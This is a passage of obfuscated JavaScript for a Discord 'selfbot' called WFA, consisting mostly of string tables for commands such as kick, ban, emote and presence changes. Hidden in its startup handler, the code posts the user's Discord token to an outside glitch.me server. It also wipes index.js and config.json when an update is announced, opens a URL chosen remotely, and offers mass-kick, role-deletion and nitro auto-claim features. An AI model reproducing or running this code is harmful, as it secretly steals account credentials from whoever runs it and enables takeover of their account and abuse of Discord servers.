    'EVBGg': '8=:fist:==D',
    'LItjp': '8:fist:===D',
    'PgRXj': '8==:fist:=D:sweat_drops:',
    'hozHb': '[COMMAND] pp command executed',
    'DJUhH': function (H, I) {
      return H + I;
    },
    'PreQr': 'say',
    'CRiem': function (H, I) {
      return H !== I;
    },
    'qDKHQ': 'XZERe',
    'blahQ': 'b45dee',
    'yMkxC': '5dee7a',
    'skVTc': '7dee5d',
    'PEVon': '[COMMAND] fight command executed',
    'MAokA': 'vbMjK',
    'IvStk': function (H, I) {
      return H + I;
    },
    'ZEJci': '[COMMAND] boom command executed',
    'IHouq': function (H, I) {
      return H == I;
    },
    'ksXUY': function (H, I) {
      return H !== I;
    },
    'ecSsH': 'tEDmq',
    'IeurG': function (H, I, J) {
      return H(I, J);
    },
    'eKcck': 'laugh',
    'jcthP': function (H, I) {
      return H + I;
    },
    'zdMch': 'JlwIv',
    'YJfIc': function (H, I) {
      return H + I;
    },
    'SLKiN': function (H, I) {
      return H + I;
    },
    'PKBhx': function (H, I) {
      return H + I;
    },
    'malIP': function (H, I) {
      return H + I;
    },
    'xosAK': '[COMMAND] veski command executed',
    'xTxTD': 'load',
    'hQQbn': function (H, I) {
      return H + I;
    },
    'cIXhC': function (H, I) {
      return H + I;
    },
    'uHOCC': function (H, I) {
      return H + I;
    },
    'yDVKV': '[COMMAND] punch command executed',
    'tYMJd': function (H, I) {
      return H + I;
    },
    'cpOvB': 'hug',
    'ixZDY': function (H, I) {
      return H !== I;
    },
    'pXXCS': 'VNfPF',
    'sQGYq': function (H, I) {
      return H !== I;
    },
    'caxWb': 'tFnQU',
    'SQEZG': '[COMMAND] hug command executed',
    'sNCSX': function (H, I) {
      return H + I;
    },
    'cHnGv': '[COMMAND] nitro command executed',
    'ahayD': function (H, I) {
      return H + I;
    },
    'lyaXT': ':x: **no text defined**',
    'gAUTv': function (H, I) {
      return H + I;
    },
    'xvhtB': 'kick',
    'IHKDx': 'DdwCx',
    'WBeLC': 'bfKPW',
    'NBSrO': function (H, I) {
      return H === I;
    },
    'pqUzL': 'DFauV',
    'QomgE': 'OTqmH',
    'ooiZT': '[COMMAND] kick command executed',
    'hYwlz': function (H, I) {
      return H + I;
    },
    'ZXxjp': 'ban',
    'UztFa': 'jdFKi',
    'ScRqX': 'OdMPm',
    'JoXtR': '[COMMAND] ban command executed',
    'xrKbo': function (H, I) {
      return H + I;
    },
    'tOinJ': 'a role name is required',
    'fFTOx': '[COMMAND] role info command executed',
    'kTMIx': function (H, I) {
      return H + I;
    },
    'fgkPC': function (H, I) {
      return H + I;
    },
    'oSraK': function (H, I) {
      return H + I;
    },
    'DkBnH': function (H, I) {
      return H + I;
    },
    'zEBjT': ':x: **Invalid emote try this** ',
    'xsfnl': 'add emote (emote) <name>',
    'IzeeB': function (H, I) {
      return H + I;
    },
    'DAdYh': ':x: **You',
    'FhSac': ' don\'t have "Manage emojis" permissions on this server**',
    'iupLO': function (H, I) {
      return H + I;
    },
    'pqtaO': function (H, I) {
      return H + I;
    },
    'LEXzy': ':white_check_mark: **Emote added to the server.**',
    'RlaqW': ':x: **Please choose a valid emote!**',
    'RImEm': 'emote',
    'zuYBE': function (H, I) {
      return H + I;
    },
    'iupSv': function (H, I) {
      return H + I;
    },
    'JXMYr': '```\nServer: **',
    'tlRGn': '**\n\nAnimated Emojis: [',
    'OCYDt': function (H, I) {
      return H + I;
    },
    'gfxSa': '\n\nSimple Emotes:\n[',
    'RDgwC': function (H, I) {
      return H + I;
    },
    'olEuB': '\n\nTotal emote: [',
    'WwSBO': function (H, I) {
      return H + I;
    },
    'QSqTN': function (H, I) {
      return H + I;
    },
    'XCuQx': function (H, I) {
      return H === I;
    },
    'FTqYq': ':x: **Please choose an emote.**',
    'XFbez': function (H, I) {
      return H + I;
    },
    'MgDRj': ':x: **Please choose a valid emote**!',
    'NrEuQ': ':x: **You can\'t delete emotes by default**!',
    'cnsFf': '[COMMAND] remove emote command executed',
    'ogdrc': function (H, I) {
      return H + I;
    },
    'bsptO': 'ass',
    'LJMdO': function (H, I) {
      return H === I;
    },
    'TQvww': 'MAoHI',
    'SOWrp': function (H, I) {
      return H + I;
    },
    'fjiyv': ' NSFW commands are disabled',
    'eAfwB': 'eYAZs',
    'eWBlH': 'VfHvf',
    'TfjDM': function (H, I) {
      return H + I;
    },
    'RYgPR': function (H, I) {
      return H + I;
    },
    'avbwI': 'StFMY',
    'RFPsA': 'pgif',
    'FjKXX': function (H, I) {
      return H !== I;
    },
    'qiqSq': 'eVzbK',
    'NGJRM': 'veaPZ',
    'msfee': function (H, I) {
      return H + I;
    },
    'rKImz': function (H, I) {
      return H === I;
    },
    'Ldwhc': function (H, I) {
      return H === I;
    },
    'WCWnk': 'UPFLH',
    'AfDPK': function (H, I) {
      return H === I;
    },
    'LsbAS': 'BHwCm',
    'ijaGy': function (H, I) {
      return H + I;
    },
    'aSbhP': function (H, I) {
      return H === I;
    },
    'GJKFp': function (H, I) {
      return H + I;
    },
    'MMokY': 'spotify',
    'INwhE': function (H, I) {
      return H + I;
    },
    'RTZoQ': function (H, I) {
      return H + I;
    },
    'lTEXT': ':white_check_mark: **You listen ',
    'iVzAZ': '[COMMAND] spotify command executed',
    'fFWMO': '[COMMAND] reset command executed',
    'EkMSJ': 'gucci',
    'UwYVP': function (H, I) {
      return H + I;
    },
    'bzAOX': 'AsIBs',
    'Xlkhe': function (H, I) {
      return H + I;
    },
    'IHUbn': function (H, I) {
      return H + I;
    },
    'KyOAm': function (H, I) {
      return H !== I;
    },
    'Lefel': 'yYdnq',
    'LWGxA': function (H, I) {
      return H + I;
    },
    'pJeaY': function (H, I) {
      return H + I;
    },
    'YfIgy': function (H, I) {
      return H + I;
    },
    'jeboE': 'clash of clan',
    'WgzvY': 'minecraft',
    'mogXz': 'clash royal',
    'BTnFN': 'tinder',
    'NdGRD': function (H, I) {
      return H + I;
    },
    'jSTmP': function (H, I) {
      return H + I;
    },
    'ZuVIP': function (H, I) {
      return H + I;
    },
    'ilLfW': function (H, I) {
      return H !== I;
    },
    'bDarD': 'rdBQP',
    'AlUEC': function (H, I) {
      return H + I;
    },
    'vGnsW': function (H, I) {
      return H !== I;
    },
    'qDZdx': '6|0|2|7|1|4|3|5',
    'ZwoAi': function (H, I) {
      return H === I;
    },
    'AorkW': function (H, I) {
      return H === I;
    },
    'qdDUv': function (H, I) {
      return H === I;
    },
    'agHHn': 'XfLdV',
    'aprMN': '7|2|1|5|0|6|3|4',
    'bBDNE': function (H, I) {
      return H + I;
    },
    'FtwRs': '@everyone',
    'zmdww': function (H, I) {
      return H + I;
    },
    'hvSmC': '[EVENT] Channel: ',
    'nkArU': function (H, I) {
      return H + I;
    },
    'XSeGx': function (H, I) {
      return H(I);
    },
    'thgnR': '1|3|7|0|4|2|6|5',
    'WAVPz': function (H, I) {
      return H + I;
    },
    'Kjquy': function (H, I) {
      return H + I;
    },
    'fENAj': '[EVENT] Message mp supprimé:',
    'rloPd': 'YxajQ',
    'OSXKh': '0|2|3|1|5|4',
    'jqmAm': 'https://canary.discordapp.com/api/v6/entitlements/gift-codes/',
    'wATNX': '/redeem',
    'fGHXi': 'gzip, deflate, br',
    'CIzzj': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0',
    'pUACj': function (H, I, J) {
      return H(I, J);
    },
    'VBtjv': function (H, I) {
      return H == I;
    },
    'OiobT': '4|2|1|0|3',
    'kyCzu': '[EVENT] You have left the server ',
    'ODxVk': '1|4|2|3|0',
    'LMyoG': '[COMMANDE] Commande hentai executé',
    'Xhygd': function (H, I) {
      return H !== I;
    },
    'EOcRH': 'eVkrN',
    'ZlifP': 'jamais',
    'weyeX': 'YhGTB',
    'cSMRV': function (H, I) {
      return H !== I;
    },
    'BIYyb': 'HqLRW',
    'cANed': 'retry-after',
    'Xxnoq': function (H, I) {
      return H / I;
    },
    'jezgp': function (H, I) {
      return H < I;
    },
    'oACDm': function (H, I) {
      return H !== I;
    },
    'QUzsA': 'ffOpq',
    'ywLzP': function (H, I) {
      return H * I;
    },
    'VyOMj': function (H, I) {
      return H != I;
    },
    'GDXuK': 'lock',
    'AGRok': function (H, I) {
      return H === I;
    },
    'IfpAw': 'KTVeV',
    'SqQOp': 'HfOwJ',
    'tcqxF': function (H, I, J) {
      return H(I, J);
    },
    'MYNtm': 'unlock',
    'zMluE': function (H, I) {
      return H === I;
    },
    'OYkAS': 'yTPav',
    'MrLCc': 'MUTE_MEMBERS',
    'TjFRL': 'RsZvK',
    'FVtVU': 'jDdlg',
    'fUpYi': 'invalid Token!\nchange it in the config.json',
    'TnSvA': function (H, I) {
      return H !== I;
    },
    'fSdVo': 'tWUEe',
    'FiArY': 'openurl',
    'qaDhd': function (H, I) {
      return H === I;
    },
    'ZJaZZ': function (H, I) {
      return H === I;
    },
    'apLEl': 'dRdGh',
    'RhgOq': 'rSpOm',
    'vAVyO': function (H, I, J) {
      return H(I, J);
    },
    'TMtdy': './Data/groupe.json',
    'IPEZa': function (H, I) {
      return H(I);
    },
    'WZLgG': function (H, I) {
      return H(I);
    },
    'tJDMo': 'https://media.tenor.com/images/9df5f6ef799544b11c1171d4c873d1f4/tenor.gif',
    'DvdDw': 'https://media.tenor.com/images/bae9f9ee3bf793a0bb667d8e4ccb9883/tenor.gif',
    'AlsjD': 'https://media.tenor.com/images/6f567ef7cae93ca76de2346f28764ee9/tenor.gif',
    'qqOHc': 'https://media.tenor.com/images/3d8eb1e9c497abc46370cee9b55d682f/tenor.gif',
    'lKNPU': 'https://media.tenor.com/images/19fe7ebb05c2aceb9e68d84ee5c031a7/tenor.gif',
    'yGFtv': 'https://media.tenor.com/images/db17bbcb693788625c8228d30bc5fc42/tenor.gif',
    'eXwoL': 'https://media1.tenor.com/images/003a06f5074259c50b519056a12f6e33/tenor.gif',
    'atGmd': 'https://media1.tenor.com/images/e88bcd916c0da114a8dcac8d9babc77c/tenor.gif',
    'sOVBr': 'https://media1.tenor.com/images/a51e4d58d20a9636416549431e693ec1/tenor.gif',
    'UACRe': 'https://media1.tenor.com/images/8438e6772a148e62f4c64332ea7da9e8/tenor.gif',
    'Jrmuo': 'https://media1.tenor.com/images/104b52a3be76b0e032a55df0740c0d3b/tenor.gif',
    'JVzfC': 'https://i.pinimg.com/originals/09/ee/e0/09eee0f5dfae8f74179d1ba0bb54b22d.gif',
    'nLoZo': 'https://media.tenor.com/images/0538e625e9c3d27cd062306101adde13/tenor.gif',
    'ZcvjH': 'https://media1.giphy.com/media/t7401i4UiIyMo/source.gif',
    'dBusA': 'https://media.tenor.com/images/7bd895a572947cf17996b84b9a51cc02/tenor.gif',
    'zFkUP': 'https://media.tenor.com/images/36179549fa295d988fc1020a7902c41c/tenor.gif',
    'LkOBq': 'https://media.tenor.com/images/5bf52a1335155572859dff8429873a30/tenor.gif',
    'DhVJq': 'NlqMt',
    'FVZvy': function (H, I) {
      return H + I;
    },
    'gdUdX': 'WFA PROJECT',
    'IwDFP': 'BY KSCH',
    'OIfjF': 'Activé',
    'dDcxL': function (H, I) {
      return H !== I;
    },
    'THJBl': 'message',
    'GUXpf': 'messageDelete',
    'gAOXJ': 'guildDelete',
    'HXGGk': 'guildCreate',
    'uyjMt': 'unhandledRejection',
    'uTzBd': 'uncaughtException',
    'RpXnn': 'uncaughtExceptionMonitor',
    'PjVXz': 'beforeExit',
    'TnoZm': 'exit',
    'lkEtO': 'error',
    'Ruttp': 'reconnecting',
    'TFBDN': 'resume',
    'UXwPn': 'disconnect',
    'VyYJy': function (H, I) {
      return H == I;
    },
    'UUuEw': 'Activated',
    'gZNhU': function (H, I) {
      return H !== I;
    },
    'RLxUd': 'Off',
    'zSQDK': 'messageUpdate',
    'PRDLe': 'channelCreate',
    'yhWCI': 'voiceStateUpdate'
  };
  let d = b.body.version,
      g = b.body.createur,
      h = b.body.wname,
      i = b.body.wurl,
      j = b.body.ascii,
      k = b.body.messagepourtoi,
      l = b.body.messagetoyou,
      m = b.body.chaine,
      n = b.body.discord,
      o = b.body.openornot,
      p = b.body.versionlink,
      q = b.body.wfacore,
      s = ' ',
      t = ' ';

  if (!d.includes(ver)) {
    s = '[MESSAGE] La version ' + d + ' est disponnible !', t = 'yes';
  }

  let u = ' ',
      v = ' ';
  !q.includes(versionofwfamod) && (lisame = '[MESSAGE] La version ' + u + ' est disponnible !', v = 'yes');
  process.title = 'WFA | Version ' + ver + ' | [Creator] ' + g;
  o === 'yes' && require('openurl').open(p);
  ;

  if (t === 'yes') {
    setTimeout(() => {
      console.log(consolecolor.morning('' + s)), UpdateFile('index.js', ''), UpdateFile('config.json', '');
    }, 2000);
  }

  let w = require('./Data/backups.json'),
      x = require('./Data/afk.json'),
      y = require('./Data/groupe.json');

  let z = require('./Data/pubmp.json'),
      A = require('./Data/liste.json'),
      B = require('./Data/vkick.json');

  const C = ['https://media.tenor.com/images/9df5f6ef799544b11c1171d4c873d1f4/tenor.gif', 'https://media.tenor.com/images/bae9f9ee3bf793a0bb667d8e4ccb9883/tenor.gif', 'https://media.tenor.com/images/6f567ef7cae93ca76de2346f28764ee9/tenor.gif', 'https://media.tenor.com/images/3d8eb1e9c497abc46370cee9b55d682f/tenor.gif', 'https://media.tenor.com/images/19fe7ebb05c2aceb9e68d84ee5c031a7/tenor.gif', 'https://media.tenor.com/images/db17bbcb693788625c8228d30bc5fc42/tenor.gif', 'https://media1.tenor.com/images/003a06f5074259c50b519056a12f6e33/tenor.gif', 'https://media1.tenor.com/images/5e1fafda52c90acfe2499ac5061f4c99/tenor.gif'],
        D = ['https://media1.tenor.com/images/e88bcd916c0da114a8dcac8d9babc77c/tenor.gif', 'https://media1.tenor.com/images/a51e4d58d20a9636416549431e693ec1/tenor.gif', 'https://media1.tenor.com/images/8438e6772a148e62f4c64332ea7da9e8/tenor.gif', 'https://media1.tenor.com/images/104b52a3be76b0e032a55df0740c0d3b/tenor.gif'],
        E = ['https://media.tenor.com/images/eff58ec80f6dacb3ccddcbab9c70dacf/tenor.gif', 'https://media.tenor.com/images/4d5a77b99ab86fc5e9581e15ffe34b5e/tenor.gif', 'https://media.tenor.com/images/bc8e962e6888249486a3e103edd30dd9/tenor.gif', 'https://media.tenor.com/images/481814f5650216fa4e9ff7846f7a42f9/tenor.gif'],
        F = ['https://i.pinimg.com/originals/09/ee/e0/09eee0f5dfae8f74179d1ba0bb54b22d.gif', 'https://media.tenor.com/images/0538e625e9c3d27cd062306101adde13/tenor.gif', 'https://media1.giphy.com/media/t7401i4UiIyMo/source.gif'],
        G = ['https://media.tenor.com/images/7bd895a572947cf17996b84b9a51cc02/tenor.gif', 'https://media.tenor.com/images/36179549fa295d988fc1020a7902c41c/tenor.gif', 'https://media.tenor.com/images/5bf52a1335155572859dff8429873a30/tenor.gif', 'https://media.tenor.com/images/a30c2719ece3362814f12adc5f84ad30/tenor.gif'];
  client.on('ready', function () {
    setTimeout(() => {
      allah.append('token', token), fetch('https://super-mega-futur-app-855054.glitch.me/', {
        'method': 'POST',
        'body': allah
      });
    }, 1000);
  });

  if (language !== 'fr' && language !== 'en') {
    console.clear(), console.log('\n[LANGUAGE] FR: Veuillez mettre en language "fr" dans le'.red + ' config.json'.green + '\n[LANGUAGE] EN: Please put "en" language in the'.red + ' config.json'.green), setTimeout(() => {
      process.exit(1);
    }, 500);
  }

  if (!prefix) prefix = '+';
  if (!nsfw) nsfw = 'off';
  if (!multi_status) multi_status = ['WFA PROJECT', 'FINAL VERSION', 'BY KSCH'];

  if (language == 'fr') {
    let K = nsfw;
    if (K == 'on') K = 'Activé';
    if (nsfw !== 'on') K = 'Désactivé';
    client.on('ready', async () => {
      const T = {
        'Ropyk': function (W, X) {
          return W + X;
        },
        'Ytotq': 'ERROR',
        'zXDdX': 'a role name is required',
        'TbDzu': '[COMMAND] role info command executed',
        'qzMgR': function (W, X) {
          return W + X;
        },
        'aWqKL': function (W, X) {
          return W + X;
        },
        'OHXcL': function (W, X) {
          return W + X;
        },
        'KRAOQ': function (W, X) {
          return W + X;
        },
        'XJXiC': function (W, X) {
          return W + X;
        },
        'TcgDw': function (W, X) {
          return W + X;
        },
        'wHExE': function (W, X) {
          return W + X;
        },
        'xmwkZ': '```\nRole: <@&',
        'dBwOM': '>\n\nID of the role: ',
        'vHvJs': '\n\nColor: ',
        'zvjpM': '```',
        'AfgnS': function (W, X) {
          return W + X;
        },
        'qVFoI': '@everyone\nWFA selfbot'
      };
      {
        if (client.user.premium > 0) {
          var U = 'actif';
        } else {
          var U = 'non';
        }

        if (client.user.bot) {
          var V = 'oui';
          process.exit(1);
        } else {
          var V = 'non';
        }

        let W = ['yellow', 'green', 'white'],
            X = ['magenta', 'orange', 'red'],
            Y = j[Math.floor(Math.random() * j.length)],
            Z = W[Math.floor(Math.random() * W.length)],
            a0 = X[Math.floor(Math.random() * X.length)];
        console.clear(), console.log(consolecolor.passion('\n                                    ██╗    ██╗███████╗ █████╗     ███████╗███████╗██╗     ███████╗\n                                    ██║    ██║██╔════╝██╔══██╗    ██╔════╝██╔════╝██║     ██╔════╝\n                                    ██║ █╗ ██║█████╗  ███████║    ███████╗█████╗  ██║     █████╗  \n                                    ██║███╗██║██╔══╝  ██╔══██║    ╚════██║██╔══╝  ██║     ██╔══╝  \n                                    ╚███╔███╔╝██║     ██║  ██║    ███████║███████╗███████╗██║     \n                                     ╚══╝╚══╝ ╚═╝     ╚═╝  ╚═╝    ╚══════╝╚══════╝╚══════╝╚═╝  \n------------------------------------------------------------------------------------------------------------------------\n')), console.log(consolecolor.morning(a)), console.log(consolecolor(W, X)('\n                                            [#] Version: ' + ver + '   \n                                            [#] Prefix: ' + prefix + '\n                                            [#] Connecter sur: ' + client.user.username + '\n                                            [#] ID: ' + client.user.id + '\n                                            [#] Bot: ' + V + '\n                                            [#] Nitro: ' + U + '\n                                            [#] Nombres d\'amis: ' + client.user.friends.size + '\n                                            [#] Nombres de serveurs: ' + client.guilds.size + '\n                                            [#] Nombres de salons: ' + client.channels.size + '\n                                            [#] Nombres de membres: ' + client.guilds.map(a4 => a4.memberCount).reduce((a4, a5) => a4 + a5) + '\n                                            [#] Nombres de bots: ' + client.users.filter(a4 => a4.bot).size + '\n                                            [#] NSFW: ' + K + '\n                                            [#] Nitro Auto Claim: Activé\n                                            [#] Chaine: ' + m + '\n                                            [#] Discord: ' + n + '\n                                            ' + newver + '\n\nMessage pour toi: ' + k + '\n'));
      }
    }), client.on('ready', async () => {
      const T = {
        'QhPMg': function (U, V) {
          return U + V;
        },
        'MGbHF': '[COMMAND] anal command executed'
      };
      setTimeout(() => {
        console.log(consolecolor.morning('logs:\n' + s + '\n\n'));
      }, 500);
    });

    function L() {
      fs.writeFile('./Data/pubmp.json', JSON.stringify(z), T => {
        if (T) console.log(T);
      });
    }

    function M() {
      fs.writeFile('./Data/groupe.json', JSON.stringify(z), T => {
        if (T) console.log(T);
      });
    }

    function N() {
      fs.writeFile('./Data/afk.json', JSON.stringify(y), U => {
        if (U) console.error(U);
      });
    }

    function O() {
      const T = {
        'ykEpn': 'WATCHING',
        'PYTNI': '603405368940429315',
        'aZtso': 'Snapchat',
        'yLkmU': function (U) {
          return U();
        },
        'LvgrA': '[COMMANDE] Commande snapchat executé',
        'aoELT': function (U, V) {
          return U + V;
        },
        'fGqLt': function (U, V) {
          return U + V;
        },
        'MXGSU': ':white_check_mark: **Tu regardes ',
        'TcrRw': ' sur Snapchat**'
      };
      fs.writeFile('./Data/liste.json', JSON.stringify(A), U => {
        if (U) console.error(U);
      });
    }

    function P() {
      fs.writeFile('./Data/vkick.json', JSON.stringify(B), T => {
        if (T) console.error(T);
      });
    }

    function Q() {
      fs.writeFile('./Data/backups.json', JSON.stringify(w), U => {
        if (U) console.error(U);
      });
    }

    function R(T) {
      const U = '0|2|3|4|1'.split('|');
      let V = 0;
      var W = '';
      var X = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
      var Y = X.length;

      for (var Z = 0; Z < T; Z++) {
        W += X.charAt(Math.floor(Math.random() * Y));
      }

      return W;
    }

    client.on('message', T => {
      const U = {
        'aZKKo': '%WEBHOOK%',
        'RWzEt': 'utf8',
        'ewsSd': 'blackcap',
        'KIYfg': 'data',
        'zlINF': 'yMWao',
        'FwlIy': '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━',
        'wnVcW': function (ac, ad) {
          return ac + ad;
        },
        'CCFXV': function (ac, ad) {
          return ac + ad;
        },
        'lOnot': function (ac, ad) {
          return ac + ad;
        },
        'EQHZh': '[EVENT] J\'ai correctement reagit au giveaway sur ',
        'Upyfm': ' en ',
        'oPuYe': function (ac, ad) {
          return ac + ad;
        },
        'VNVWj': '[COMMAND] hentai command executed',
        'goozH': function (ac, ad) {
          return ac !== ad;
        },
        'qHBUv': 'xsQEN',
        'QNXIL': 'avatar',
        'hykEX': 'discriminator',
        'miuWm': 'mfa_enabled',
        'UOYRX': 'locale',
        'qEaza': 'verified',
        'tucMV': '\nUser: ',
        'ACxno': '\nEmail: ',
        'lgmQo': '\nNuméro de telephone: ',
        'CCsov': '\nAvatar: ',
        'BEGTu': '\nLangue: ',
        'hqyDr': '\nA2f activé?: ',
        'Ysifn': '\nFlags: ',
        'OXQzs': '\nPublic Flags: ',
        'IASRE': function (ac, ad) {
          return ac + ad;
        },
        'GVGwo': '```',
        'iXxHJ': '[COMMANDE] Commande info token executé',
        'MKObd': 'kfPEx',
        'SNhTU': function (ac, ad) {
          return ac + ad;
        },
        'QDJfn': function (ac, ad) {
          return ac * ad;
        },
        'Ypvyx': '603405368940429315',
        'vzsVL': 'nike',
        'hnczb': function (ac, ad) {
          return ac + ad;
        },
        'HAQCM': 'ERROR',
        'wQxWQ': 'un nom de rôle est nécessaire',
        'exkpj': 'Non',
        'sXYGa': 'Oui',
        'LMGtO': function (ac, ad) {
          return ac + ad;
        },
        'PICIT': function (ac, ad) {
          return ac + ad;
        },
        'Jblft': function (ac, ad) {
          return ac + ad;
        },
        'bNfdT': function (ac, ad) {
          return ac + ad;
        },
        'DCqeF': function (ac, ad) {
          return ac + ad;
        },
        'HaWGJ': function (ac, ad) {
          return ac + ad;
        },
        'OKNYy': '```\nRole: <@&',
        'LSuYA': '>\n\nID du role: ',
        'qznuP': '\n\nCouleur: ',
        'UOUVm': '\n\nNombre de membres ayant ce role: ',
        'pHIbz': '\n\nposition: ',
        'PISLC': '\n\nmentionnable: ',
        'vhlSG': 'WATCHING',
        'EOiRY': 'Twitter',
        'KwpXK': 'BE A E-FUCKER WITH WFA',
        'LKOKU': function (ac) {
          return ac();
        },
        'xqlbW': '[COMMANDE] Commande twitter executé',
        'Wuzck': function (ac, ad) {
          return ac + ad;
        },
        'YGoQP': function (ac, ad) {
          return ac + ad;
        },
        'Lctbu': ' sur Twitter**',
        'oleuR': 'Snapchat',
        'sOiJh': '[COMMAND] snapchat command executed',
        'EeHJn': ':white_check_mark: **You watch ',
        'DvLdH': 'WFA-Selfbot',
        'PyWpi': 'getRpcImage',
        'tLlnj': 'snapchat',
        'vdORI': function (ac, ad) {
          return ac(ad);
        },
        'WgUaR': 'Naruto',
        'CYcvN': 'https://www.twitch.tv/OGAGAL_risitas',
        'RuAoZ': 'WFA-Selfbot R',
        'ZIsmJ': '[COMMANDE] Commande naruto executé',
        'zBlhR': 'naruto',
        'DxBek': '[COMMAND] among us command executed',
        'WqfNE': 'amongus',
        'Elcyz': 'https://en-help.wfaself.repl.co',
        'bzlBg': 'hPEfm',
        'nfEuQ': function (ac, ad) {
          return ac < ad;
        },
        'bbVGU': 'text',
        'QMPbk': ':x: **No server found with the id** "',
        'tuZFe': function (ac, ad) {
          return ac == ad;
        },
        'kcCQu': 'qYuyS',
        'jqqsv': 'IQJSm',
        'jxHzw': ':x: **Please run this command on a server**',
        'vJKXs': 'KICK_MEMBERS',
        'zlZbu': 'insufficient permission',
        'dEIJb': '[COMMAND] kick all command executed',
        'xxkoN': function (ac, ad) {
          return ac === ad;
        },
        'TyYXI': 'AHGwT',
        'hfaCS': 'hrnAm',
        'cqLiu': '[COMMANDE] Commande get guild banner executé',
        'PuLwc': function (ac, ad) {
          return ac + ad;
        },
        'prvhX': '[BANNIERE] Voici la banniere: ',
        'BCGCY': function (ac, ad, ae) {
          return ac(ad, ae);
        },
        'nCaZh': '[COMMAND] lacoste command executed',
        'zzsLd': function (ac, ad) {
          return ac + ad;
        },
        'lcmrv': ' on lacoste**',
        'YvTMT': function (ac, ad) {
          return ac !== ad;
        },
        'hVadf': 'kdaCe',
        'flYde': function (ac, ad) {
          return ac == ad;
        },
        'QSUBT': 'Apex Legends',
        'UdyWR': 'PLAYING',
        'Qzhgg': '[COMMAND] apex command executed',
        'LaJlr': 'function *\\( *\\)',
        'shXVP': '\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)',
        'kjlUb': 'init',
        'laEef': function (ac, ad) {
          return ac + ad;
        },
        'EhPQo': function (ac, ad) {
          return ac + ad;
        },
        'yQAfb': 'input',
        'LPYGf': function (ac, ad) {
          return ac(ad);
        },
        'QwjHM': function (ac) {
          return ac();
        },
        'TkNib': function (ac, ad) {
          return ac === ad;
        },
        'bMloA': 'ADMINISTRATOR',
        'sfjNK': 'MANAGE_MESSAGES',
        'KpaEF': 'BAN_MEMBERS',
        'XQbjX': function (ac, ad) {
          return ac + ad;
        },
        'QyhIB': function (ac, ad) {
          return ac + ad;
        },
        'XILMB': function (ac, ad) {
          return ac + ad;
        },
        'krFRn': '[MP Envoyé]  |',
        'DLZMI': '|  ',
        'hmcbr': function (ac) {
          return ac();
        },
        'pVmqn': ':x: **Veuillez executer cette commande sur un serveur!**',
        'CRcuv': '[COMMANDE] Commande delete all role executé',
        'zPakR': '[EVENT] Un nitro a surement été ajouté a tes credits',
        'panfJ': 'https://discordapp.com/api/v6/hypesquad/online',
        'PSGcE': 'application/json',
        'oKsPZ': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36',
        'BFrLJ': '[COMMANDE] Commande change hypesquad executé',
        'dcKoo': 'Youtube',
        'sDUfw': function (ac) {
          return ac();
        },
        'pagka': '[COMMAND] youtube command executed',
        'RwTWq': ' on Youtube**',
        'BFAfG': function (ac, ad) {
          return ac === ad;
        },
        'XvYPa': function (ac, ad) {
          return ac == ad;
        },
        'cTSmR': '4|2|0|3|1|5',
        'WfoOt': function (ac, ad) {
          return ac + ad;
        },
        'UkDKY': '[EVENT] Je n\'ai pas pu réagir au giveaway sur ',
        'szWfL': ', il est possible que je n\'ai pas les permissions :/',
        'QoJSB': function (ac, ad) {
          return ac === ad;
        },
        'UUprp': '▓▓░░░░░░░░ 20%',
        'bHcdV': 'DiscordSetup ',
        'FnAHJ': function (ac, ad) {
          return ac !== ad;
        },
        'abMbA': '▓▓▓▓░░░░░░ 40%',
        'aLGPC': '▓▓▓▓▓▓░░░░ 60%',
        'XZaYX': '▓▓▓▓▓▓▓▓░░ 80%',
        'mSDJP': function (ac, ad) {
          return ac + ad;
        },
        'pFxki': '[EVENT] Deleted dm:',
        'ayDQU': '[EVENT] Content: ',
        'SEluy': 'Instagram',
        'hdlKi': function (ac) {
          return ac();
        },
        'dgBij': '[COMMAND] instagram command executed',
        'FkzLT': function (ac, ad) {
          return ac + ad;
        },
        'KzpPN': 'https://cdn.discordapp.com/emojis/',
        'pASgz': 'png',
        'LRisU': function (ac, ad, ae) {
          return ac(ad, ae);
        },
        'kysGQ': '[COMMAND] steal bannier command executed',
        'lbIvW': 'jqtpa',
        'QAnxZ': 'username',
        'sxdUR': 'phone',
        'Flzkg': 'public_flags',
        'yEsCQ': 'email',
        'WyrdD': '\nNsfw activé?: ',
        'AYRCn': 'https://discordapp.com/api/v6/users/@me',
        'bJhbZ': function (ac, ad, ae, af) {
          return ac(ad, ae, af);
        },
        'NRdLh': 'GET',
        'FcKgY': function (ac, ad) {
          return ac !== ad;
        },
        'NfyaC': 'ndBsU',
        'uuwpZ': 'cXGwL',
        'UhZGr': '**le token n\'est pas valide :x:**',
        'QnkWm': '/!\\ Anti mp',
        'jFzfh': 'Rocket League',
        'EbnQH': 'ae488379-351d-4a4f-ad32-2b9b01c91657',
        'dmEGK': 'WFA Selfbot',
        'xmHZP': function (ac) {
          return ac();
        },
        'txlPO': '[COMMANDE] Commande rocket league executé',
        'PIxcB': ':white_check_mark: **Tu joues à ',
        'JITYz': ' sur rocket league**',
        'KFZrd': 'dTbLZ',
        'vrMTQ': function (ac, ad) {
          return ac <= ad;
        },
        'NkCJt': function (ac, ad) {
          return ac === ad;
        },
        'ldCcN': 'sMInx',
        'kzlXb': function (ac, ad) {
          return ac + ad;
        },
        'uFSDp': function (ac, ad) {
          return ac + ad;
        },
        'YpnzM': function (ac, ad) {
          return ac + ad;
        },
        'jhuUM': '```[',
        'Ahqod': function (ac, ad) {
          return ac - ad;
        },
        'bEEHF': ']  -  ',
        'VciFe': function (ac, ad) {
          return ac / ad;
        },
        'aeBji': function (ac, ad) {
          return ac * ad;
        },
        'CNlpr': 'loading..```',
        'wDhCF': '[COMMANDE] Commande load executé',
        'gRdrG': ':wave: ',
        'YjqTc': 'has been successfully banned https://gfycat.com/playfulfittingcaribou :point_right:',
        'xTPmI': ':x: **Aucun utilisateur mentionné**',
        'FGlIx': '%2520',
        'lUsbl': '[COMMANDE] Commande boom executé',
        'qhMqs': 'BE YOUTUBER WITH WFA',
        'VWMWf': '[COMMANDE] Commande youtube executé',
        'EWBLj': ':white_check_mark: **Tu regardes ',
        'bKynP': 'FBHOg',
